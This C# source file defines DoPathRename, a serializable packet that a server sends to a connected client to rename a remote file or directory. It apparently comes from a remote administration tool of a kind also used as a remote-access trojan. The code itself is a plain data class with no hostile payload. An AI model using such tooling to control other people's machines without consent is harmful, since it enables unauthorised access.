using ProtoBuf;
using xServer.Core.Networking;
using xServer.Enums;

namespace xServer.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class DoPathRename : IPacket
    {
        [ProtoMember(1)]
        public string Path { get; set; }

        [ProtoMember(2)]
        public string NewPath { get; set; }

        [ProtoMember(3)]
        public PathType PathType { get; set; }

        public DoPathRename()
        {
        }

        public DoPathRename(string path, string newpath, PathType pathtype)
        {
            this.Path = path;
            this.NewPath = newpath;
            this.PathType = pathtype;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}